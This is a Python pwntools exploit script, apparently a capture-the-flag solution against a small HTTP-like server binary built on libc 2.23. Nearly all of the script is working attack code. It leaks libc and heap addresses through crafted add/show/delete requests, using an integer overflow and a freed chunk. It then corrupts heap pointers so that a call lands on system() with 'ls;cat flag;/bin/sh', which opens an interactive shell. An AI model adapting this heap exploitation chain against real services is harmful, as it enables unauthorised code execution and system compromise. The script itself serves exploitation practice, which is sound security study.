#encoding:utf-8
#!/upr/bin/env python
from pwn import *
def debug(addr=0,pie=0):
    global p
    if pie:
        text_base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        log.info("ELF_base:{}".format(hex(text_base)))
        log.info("bss:{}".format(hex(text_base + 0x204120)))
        #log.info("get_array:{}".format(hex(text_base + 0x202140)))
        # gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        if addr!=0:
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p)
    else:
        if addr!=0:
            gdb.attach(p,'b *{}'.format(hex(addr)))
        else:
            gdb.attach(p)
    pause()
#-------------------------------------
def sl(s):
    return p.sendline(s)
def sd(s):
    return p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def sla(a,s):
    return p.sendlineafter(a,s)
def sda(a,s):
    return p.sendafter(a,s)
def getshell():
    # p.sendline("ls")
    p.interactive()
def msg(msg,addr):
    log.warn(msg+"->"+hex(addr))
#-------------------------------------

def add(idd,pwd,name,num):
    pay="POST / index.html \t\n"
    pay+=" Connection: keep-alive"
    pay+="cmd=add&id="+idd
    pay+="&pwd="+str(pwd)
    pay+="&num="+str(num)
    pay+="&name="+name
    
    
    ru("<<:\n")
    sd(pay)

def show(idd,pwd):
    pay="GET / index.html Connection: keep-alive"
    ru("<<:\n")
    sd(pay)
    ru("<<:\n")
    sd(idd+"\x00")
    ru("<<:\n")
    sd(str(pwd)+"\x00")

def free():
    pay="POST / index.html \t\ncmd=delete"
    pay+=" Connection: keep-alive"
    ru("<<:\n")
    sd(pay)


def exp():
    # debug()
    add("1",1,"a"*0x50,2147483648)
    add("2",2,"b"*0x50,200)
    add("3",3,"c"*0x50,200)
    add("4",4,"d"*0x50,200)
    add("5",2333,"e"*0x50,200)
    
    
    
    # debug(0x1A66,pie=1)
    # debug(0x401894,pie=0)
    show("1",1)

    
    #pie------------------------
    # ru(p64(1))
    # ru(p64(0))
    # elf_base=u64(p.recv(6).ljust(8,"\x00"))-0x2345
    # print "elf base:"+hex(elf_base)
    # ru(p64(elf_base+0xdd7))
    # ru(p64(0))
    # libc_base=u64(p.recv(6).ljust(8,"\x00"))-0x20830
    # libc.address=libc_base
    # system=libc.sym["system"]
    # print "libc base:"+hex(libc_base)
    #pie-----------------------
    
    ru(p64(0x400c77))
    ru(p64(0))
    libc_base=u64(p.recv(6).ljust(8,"\x00"))-0x20830
    libc.address=libc_base
    system=libc.sym["system"]
    print "libc base:"+hex(libc_base)


    free()
    # print p.recv()
    sleep(5)
    # 
    show("2",0)
    ru("welcome! ")
    heap=u64(ru("</h1><hr>")[:-9].ljust(8,"\x00"))
    msg("heap",heap)
    
    add("6",1,p64(heap+0x2c0).ljust(0x50,"a"),200)
    sleep(2)
    # debug(pie=0)

    add("7",233,p64(0x602ffa).ljust(0x20,'a'),200)

    # print p.recvall()
    
    add("8",2333,"A"*0x50,200)

    add("9",3,"ls;cat flag;/bin/sh\x00".ljust(0x50,'x'),200)
    
    add("10",233,("X"*(6+8)+p64(system)[:-2]+'\x00').ljust(0x50,'X'),200)
    sleep(4)
    # print p.recv()
    getshell()

if __name__ == '__main__':
    bin_elf = "./server"
    elf = ELF(bin_elf)
    context.binary=bin_elf
    context.log_level = "debug"
    #context.terminal=['tmux', 'splitw', '-h']
    if sys.argv[1] == "r":
        p = remote("0.0.0.0",0000)
        libc = ELF("./libc-2.23.so")
    elif sys.argv[1] == "l":
        libc = elf.libc
        #取消aslr保护机制
        #p = process(bin_elf, aslr=0)
        #加入libc进行调试：
        #p = process(bin_elf,env = {"LD_PRELOAD": "../libc-2.23.so.i386"})
        p = process(bin_elf)
    exp()